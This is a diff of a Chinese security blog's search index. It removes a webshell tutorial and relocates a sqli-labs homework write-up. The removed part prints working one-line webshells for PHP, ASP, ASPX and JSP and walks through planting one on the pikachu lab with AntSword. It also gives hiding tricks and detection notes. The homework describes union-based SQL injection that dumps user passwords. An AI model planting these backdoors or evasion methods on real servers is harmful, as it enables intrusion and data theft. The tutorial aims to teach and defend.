@@ -173,33 +173,14 @@
 <p>小马，一般而言，我们在上传文件的时候，会被限制上传的文件大小或是拦截的情况，那么我通过小马来上传大马，实现我们想要的功能。</p>
 <p>一句话木马，短小精悍、功能强大、隐蔽性好、使用客户端可以快速管理webshell。</p>
 <p>原理<br>利用文件上传漏洞、SQL注入漏洞、RCE漏洞等，将恶意文件放到web服务器中，也就是常说的”后门”，之后可以进行文件管理、数据库管理、远程命令执行、提权等恶意操作。</p>
-<p>常见一句话木马<br>php<br><?php @eval($_POST[value]); ?><br><?php assert($_POST[value]);?><br><?php
-@preg_replace("/[email]/e",$_POST['h'],"error");
-?><br>asp<br>&lt;%eval request (“value”)%&gt;<br>&lt;% execute(request(“value”)) %&gt;<br>aspx<br>&lt;%@ Page Language=”Jscript” %&gt; &lt;% eval(Request.Item[“value”]) %&gt;<br>jsp<br>&lt;%<br>if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(“\“)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());<br>%&gt;<br>攻击<br>靶机：pikachu</p>
-<p>工具：中国蚁剑</p>
-<p>首先，利用文件上传漏洞，上传webshell文件</p>
-<p>网络安全-文件上传漏洞的原理、攻击与防御_lady_killer9的博客-CSDN博客</p>
-<p>文件为eval.php，内容为</p>
-<?php eval($_POST['eval']); ?>
-
-<p> 之后利用中国蚁剑连接网站，空白处右键-&gt;添加数据</p>
-<p>添加数据</p>
-<p>添加数据成功</p>
-<p>上传文件及其他功能</p>
-<p>终端控制<br> 再打开上传webshell的那个目录，可以看到多出来了%SystemDrive%目录， </p>
-<p>目录变化<br>至此，可以进行文件管理，虚拟终端等。</p>
-<p>WebShell管理工具<br>Cknife 中国菜刀<br>antSword 中国蚁剑<br>冰蝎 动态二进制加密网站管理客户端<br>weevely3 Weaponized web shell<br>Altman the cross platform webshell tool in .NET<br>Webshell Sniper Manage your website via terminal<br>quasibot complex webshell manager, quasi-http botnet<br>webshell隐藏<br>隐藏到日志</p>
-<p>例如，修改发送数据包的头部，添加webshell。 web服务器一般会保存访问记录到Web日志，若找到web日志，且放到可执行目录下，可能获得shell。</p>
-<p>隐藏到合法文件</p>
-<p>例如，文件上传漏洞中，将php代码放到jpg文件中，可以使用@运算符，以防发生任何错误。</p>
-<p>混淆</p>
-<p>删除空格、换行符等，导致代码文件比较乱，使用编码或加密来隐藏掉恶意函数名等。</p>
-<p>检测与防御<br>静态检测<br>web日志</p>
-<p>在对日志文件进行预处理后，对日志记录进行文本特征匹配、统计特征计算与文件关联性分析，最后对检测结果汇总，列出疑似的Webshell文件。</p>
-<p>例如，网站目录下某php文件访问量过少，且来源ip固定。</p>
-<p>动态检测</p>
-<p>webshell传到服务器了，黑客总要去执行它吧，webshell执行时刻表现出来的特征，我们称为动态特征。</p>
-<p>例如，webshell如果执行系统命令的话，会有进程。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>张轩儒作业</title>
+    <url>/2022/03/24/%E5%BC%A0%E8%BD%A9%E5%84%92%E4%BD%9C%E4%B8%9A/</url>
+    <content><![CDATA[<p>###Less-1(第一关)<br>首先输入正确的url<br><img src="/images/01.png"><br>看图能够知道本关的查询结果是会回显的<br>然后加上单引号，看下图</p>
+<span id="more"></span>
+<p><img src="/images/1.png"><br>可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关是闭合单引号<br>下面两步找列数,具体看图片操作<br><img src="/images/4.png"><br><img src="/images/3.png"><br>确定哪个字段有回显<br><img src="/images/5.png"><br>确定当前数据库<br><img src="/images/6.png"><br>爆出当前数据库内的所有表名<br><img src="/images/7.png"><br>爆出当前数据库user表的所有列名<br><img src="/images/8.png"><br>爆出当前数据库user表所有username和password<br><img src="/images/9.png"><br>###Less-2(第二关)<br>首先输入正确的url<br><img src="/images/10.png"><br>能够知道本关的查询结果是会回显的<br>然后输入’<br>可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关不用闭合<br><img src="/images/11.png"><br>这关使用union注入,看下图<br>下面两步找列数<br><img src="/images/12.png"><br><img src="/images/13.png"><br>确定哪个字段有回显<br><img src="/images/14.png"><br>确定当前数据库<br><img src="/images/15.png"><br>爆出当前数据库内的所有表名<br><img src="/images/16.png"><br>爆出当前数据库user表的所有列名<br><img src="/images/17.png"><br>爆出当前数据库user表所有username和password<br>看图第二关通关<br><img src="/images/18.png"><br>###Less-3(第三关)<br>首先输入正确的url<br><img src="/images/20.png"><br>能够知道本关的查询结果是会回显的<br>然后加上’可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关闭合是’)看下图<br><img src="/images/21.png"><br>这关使用union注入<br>下面两步找列数<br><img src="/images/22.png"><br><img src="/images/23.png"><br>确定哪个字段有回显<br><img src="/images/24.png"><br>确定当前数据库<br><img src="/images/25.png"><br>爆出当前数据库内的所有表名<br><img src="/images/26.png"><br>爆出当前数据库user表的所有列名<br><img src="/images/27.png"><br>爆出当前数据库user表所有username和password<br><img src="/images/28.png"><br>第三关通关</p>
 ]]></content>
   </entry>
   <entry>
@@ -485,14 +466,6 @@ OWASP XSS过滤备忘单：Redirecting…
 <p>可以查看本地敏感文件，如/etc/passwd等</p>
 <p>可以包含日志文件，通过其他手段写到日志文件，如WAF日志，ssh登录日志</p>
 <p>防御<br>文件包含参数写死<br>文件包含参数不可由用户修改<br>禁用目录跳转字符”../“<br>使用文件验证白名单</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>张轩儒作业</title>
-    <url>/2022/03/24/%E5%BC%A0%E8%BD%A9%E5%84%92%E4%BD%9C%E4%B8%9A/</url>
-    <content><![CDATA[<p>###Less-1(第一关)<br>首先输入正确的url<br><img src="/images/01.png"><br>看图能够知道本关的查询结果是会回显的<br>然后加上单引号，看下图</p>
-<span id="more"></span>
-<p><img src="/images/1.png"><br>可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关是闭合单引号<br>下面两步找列数,具体看图片操作<br><img src="/images/4.png"><br><img src="/images/3.png"><br>确定哪个字段有回显<br><img src="/images/5.png"><br>确定当前数据库<br><img src="/images/6.png"><br>爆出当前数据库内的所有表名<br><img src="/images/7.png"><br>爆出当前数据库user表的所有列名<br><img src="/images/8.png"><br>爆出当前数据库user表所有username和password<br><img src="/images/9.png"><br>###Less-2(第二关)<br>首先输入正确的url<br><img src="/images/10.png"><br>能够知道本关的查询结果是会回显的<br>然后输入’<br>可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关不用闭合<br><img src="/images/11.png"><br>这关使用union注入,看下图<br>下面两步找列数<br><img src="/images/12.png"><br><img src="/images/13.png"><br>确定哪个字段有回显<br><img src="/images/14.png"><br>确定当前数据库<br><img src="/images/15.png"><br>爆出当前数据库内的所有表名<br><img src="/images/16.png"><br>爆出当前数据库user表的所有列名<br><img src="/images/17.png"><br>爆出当前数据库user表所有username和password<br>看图第二关通关<br><img src="/images/18.png"><br>###Less-3(第三关)<br>首先输入正确的url<br><img src="/images/20.png"><br>能够知道本关的查询结果是会回显的<br>然后加上’可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关闭合是’)看下图<br><img src="/images/21.png"><br>这关使用union注入<br>下面两步找列数<br><img src="/images/22.png"><br><img src="/images/23.png"><br>确定哪个字段有回显<br><img src="/images/24.png"><br>确定当前数据库<br><img src="/images/25.png"><br>爆出当前数据库内的所有表名<br><img src="/images/26.png"><br>爆出当前数据库user表的所有列名<br><img src="/images/27.png"><br>爆出当前数据库user表所有username和password<br><img src="/images/28.png"><br>第三关通关</p>
 ]]></content>
   </entry>
 </search>
